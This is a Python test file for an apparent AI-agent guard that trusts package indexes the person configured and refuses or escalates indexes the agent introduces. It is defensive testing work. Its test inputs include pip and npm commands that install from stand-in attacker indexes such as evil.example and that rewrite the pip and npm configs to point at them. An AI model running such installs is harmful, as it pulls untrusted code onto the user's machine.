"""Package indexes: the person's own (set up outside the agent) are trusted, the ones the agent brings in are the agent's
decision (guard/index_trust.py, 2026-10-23). Offline: scans are faked. run: python3 tests/test_index_trust.py"""
import json
import os
import sys
import tempfile
from pathlib import Path

HOME = tempfile.mkdtemp()
os.environ.update({"HOME": HOME, "AEGIS_ML": "0", "AEGIS_MODE": "auto"})
for k in ("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "UV_INDEX_URL", "PIP_CONFIG_FILE", "VIRTUAL_ENV"):
    os.environ.pop(k, None)
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "guard"))
import guard_core  # noqa: E402
import index_trust  # noqa: E402
import scan_engine as se  # noqa: E402

guard_core.check_integrity = lambda: []
CORP, EVIL = "https://pypi.corp.example/simple", "https://evil.example/simple"
INTERNAL = {"corp-utils"}                                    # not on PyPI: a company package


def fake_scan(items):
    out = []
    for n, v in items:
        if n in INTERNAL:
            out.append(se.Verdict("NEEDS_HUMAN_REVIEW", 0.0, [], se.ScanFeatures(name=n, version=v, fetch_ok=False,
                                                                                 fetch_error="HTTP Error 404: Not Found")))
        else:
            out.append(se.Verdict("ALLOW", 0.0, [], se.ScanFeatures(name=n, version="1", fetch_ok=True)))
    return out


guard_core.scan_packages = fake_scan
se.ECOSYSTEM_SCANNERS["npm"] = lambda name, spec=None: se.Verdict("ALLOW", 0.0, [], se.ScanFeatures(name=name, version="1", fetch_ok=True))
pip_conf = Path(HOME, ".config", "pip", "pip.conf")


def set_pip_conf(*urls):
    pip_conf.parent.mkdir(parents=True, exist_ok=True)
    pip_conf.write_text("[global]\nindex-url = " + urls[0] + "\n" + "".join(f"extra-index-url = {u}\n" for u in urls[1:]))


def state():
    return json.loads(index_trust.state_file().read_text())


with tempfile.TemporaryDirectory() as d:
    def cmd(c):
        return guard_core.check_command(c, d)

    # 1. the person's company mirror (configured before / outside the agent): installs go on, it is remembered as trusted
    set_pip_conf(CORP)
    assert cmd("pip install requests").action == "allow"
    assert index_trust.norm(CORP) in state()["trusted"]
    # a company package that PyPI does not have: installed from that mirror, recorded as such, not a card
    assert cmd("pip install corp-utils").action == "allow"
    rec = json.loads(Path(d, ".aegis", "last_review.json").read_text())["packages"][0]
    assert rec.get("internal_index") and rec["verdict"] == "ALLOW", rec
    # the same mirror named in the command is still the person's own
    assert cmd(f"pip install -i {CORP} requests").action == "allow"

    # 2. an index chosen in the command that the person does not use: the agent decides (card + ack)
    r = cmd(f"pip install -i {EVIL} requests")
    assert r.action == "refuse" and "ack id" in r.reason, r
    r = cmd(f"PIP_INDEX_URL={EVIL} pip install requests")
    assert r.action == "refuse", r
    # a name not on PyPI from an index the agent chose is not "internal"
    assert cmd(f"pip install -i {EVIL} corp-utils").action == "refuse"

    # 3. the agent changes the config (passes in auto mode, recorded), then installs: the evil index is the agent's
    assert cmd(f"pip config set global.index-url {EVIL}").action == "allow"
    assert index_trust.norm(EVIL) in state()["agent"]
    set_pip_conf(EVIL)                                       # what that command does on disk
    r = cmd("pip install requests")
    assert r.action == "refuse" and "index added by the agent" in json.dumps(
        json.loads(Path(d, ".aegis", "last_review.json").read_text()), ensure_ascii=False), r

    # 4. through the file tools: the URL is read from the new text
    other = "https://other.example/simple"
    assert guard_core.check_file_write(str(pip_conf), f"[global]\nindex-url = {other}\n", d).action == "allow"
    assert index_trust.norm(other) in state()["agent"]

    # 5. a shell write whose URL the guard cannot see: the next new index in a config is taken as the agent's
    assert cmd("cat /tmp/x.conf > ~/.config/pip/pip.conf").action == "allow"
    assert state()["pending"]
    third = "https://third.example/simple"
    set_pip_conf(CORP, third)
    r = cmd("pip install requests")
    assert r.action == "refuse", r
    assert index_trust.norm(third) in state()["agent"] and not state()["pending"]
    assert index_trust.norm(CORP) in state()["trusted"]      # the person's mirror stays trusted

    # 6. user mode: the agent's index is the person's question, the person's own index is nothing to ask about
    os.environ["AEGIS_MODE"] = "user"
    set_pip_conf(EVIL)
    assert cmd("pip install requests").action == "confirm"
    set_pip_conf(CORP)
    assert cmd("pip install requests").action == "allow"
    os.environ["AEGIS_MODE"] = "auto"

    # 7. npm: the person's .npmrc registry is trusted, one chosen in the command is not, one the agent set is not
    reg = "https://npm.corp.example"
    Path(HOME, ".npmrc").write_text(f"registry={reg}\n")
    assert cmd("npm install left-pad").action == "allow"
    assert cmd("npm install left-pad --registry https://npm.evil.example").action == "refuse"
    assert cmd("npm config set registry https://npm.evil2.example").action == "allow"
    Path(HOME, ".npmrc").write_text("registry=https://npm.evil2.example\n")
    assert cmd("npm install left-pad").action == "refuse"
print("index_trust: all cases passed")
